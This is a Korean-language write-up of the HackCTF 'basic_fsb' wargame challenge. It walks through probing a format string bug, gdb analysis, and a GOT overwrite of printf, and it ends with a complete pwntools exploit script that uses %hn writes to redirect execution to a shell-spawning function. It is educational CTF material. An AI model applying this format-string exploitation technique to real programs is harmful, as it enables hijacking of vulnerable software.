---
title: "HackCTF basic_fsb Write-Up"
tags: ["wargame"]
categories: ["System"]
---

# Index

1. [문제 분석](#문제-분석)

* * *

## 문제 분석

문제를 다운로드 받으면 제목에서 알 수 있듯이 Format String Bug와 관련된 문제임을 예상할 수 있습니다.

FSB 문제에서 취약점을 찾는 방법은 입력값에 `%x, %d` 와 같은 특별한 용도로 사용되는 지시자를 입력해보는 것입니다. 문제를 실행하면 한 번의 입력을 받는 것을 확인할 수 있었습니다.

```
root@3218f793af99:~/hackctf/basic_fsb# ./basic_fsb
input : AAAA %x %x %x %x %x %x
AAAA f7fc72b4 41414141 20782520 25207825 78252078 20782520
```

`%x` 지시자를 사용했을 때 의도되지 않은 값을 출력하는 것을 보아 FSB 취약점이 있는 것은 확인할 수 있었습니다. 추가적으로 출력값에서 주목해야 할 부분은 "41414141" 입니다.

`%x`는 Hex 값을 출력하므로 이는 가장 처음에 입력한 "AAAA" 문자임을 알 수 있습니다. FSB 취약점을 통해서 진행할 수 있는 공격에는 크게 "GOT overwrite"와 ".dtors 영역"을 사용하는 방법이 있습니다.

우선 이 문제를 해결하기 위해서는 별도로 shell을 호출하는 함수가 존재하기에 GOT overwrite를 사용할 것입니다. Format string bug에 관해서는 이전에 공부하며 다른 문제를 풀었던 경험이 있기에 어려운 개념은 아니었습니다. 관련 내용은 [[게시글](https://jun-project-lab.github.io/system/fsb/)]에서 정리하였습니다.

그럼에도 불구하고 Exploit에 꽤나 많은 시간이 필요하였고 이 과정에서 새롭게 알게된 개념들에 대해 다시금 정리하기 위해 Write-Up을 작성하게 되었습니다.

## GDB 분석

Payload 작성을 위해 gdb를 사용하여 분석을 시도하였습니다. 또한 어느 지점에서 취약점이 발생하는지 또한 확인하는 시간을 가졌습니다.

먼저 `info functions`을 통해 main, vuln, flag 세 개의 함수를 확인할 수 있었습니다.

```
0x0804854b  vuln
0x080485b4  flag
0x080485ed  main
```

flag 함수의 경우 shell을 호출하는 함수였으며 vuln 함수의 경우 사실 상 프로그램의 전반적인 동작을 모두 담고 있는 함수였습니다. main 함수는 vuln 함수를 호출 후 해당 함수의 동작이 종료될 시 같이 종료되었습니다.

vuln 함수를 분석해보면 `fgets()` 함수를 통해 입력받은 값을 `snprintf()` 함수로 일차적으로 이동 후 `printf()` 함수로 최종적으로 출력을 진행하였습니다.

`snprintf()`와 `printf()` 함수 모두 format string을 사용하는 함수이기에 어떤 함수에서 fsb가 발생하는지 우선 확인하였습니다.

gdb를 통해 함수의 진행과 값의 변화를 확인한 결과 `snprintf()`에서 fsb가 발생한 값을 변수에 저장 후 해당 변수를 `printf()`를 통해 출력하는 것을 통해 `snprintf()`에서 fsb가 발생한다고 판단하였습니다.

다음으로는 GOT overwrite를 할 대상 함수를 찾아보았습니다. GOT overwrite를 성공하기 위해서는 overwrite 후 해당 함수가 호출될 필요가 있었기에 `snprintf()`가 호출된 이후 후행되는 함수들 중 선택할 필요가 있었습니다.

후행되는 함수 중에서는 `printf()`만이 존재하였고 해당 함수의 GOT를 목표로 payload 작성을 진행하였습니다.

## Exploit

Exploit code를 작성하며 기존에 잘못 알고 있던 개념 몇 가지를 바로 잡을 수 있었습니다. `%n, %hn` 지시자 등을 통해 특정 주소에 값을 저장할 때 해당 **주소**를 변조하는 것이 아닌 해당 주소의 **값**을 변조하는 것이었습니다.

> Example

```
\xbe\xba\xfe\xca%Nc%n 과 같이 사용할 경우 0xcafebabe 주소를 직접 변조하는 것이 아닌 해당 주소에 저장되어 있는 값을 변조함
```

대부분의 Write-Up은 `%n`을 사용해서 전체 주소를 변조하는 내용이기에 `%hn`을 통해 절반 씩 변조하는 payload를 작성해보았습니다.

```python
#!/usr/bin/python3

import pwn 

p = pwn.remote("ctf.j0n9hyun.xyz", 3002)
#pwn.context.log_level = 'debug'

flag = 0x080485b4
printfGot = 0x0804a00c

payload = pwn.p32(printfGot+2)
payload += pwn.p32(printfGot)
payload += b"%2044c%2$hn"
payload += b"%32176c%3$hn"

p.sendline(payload)

p.interactive()
```
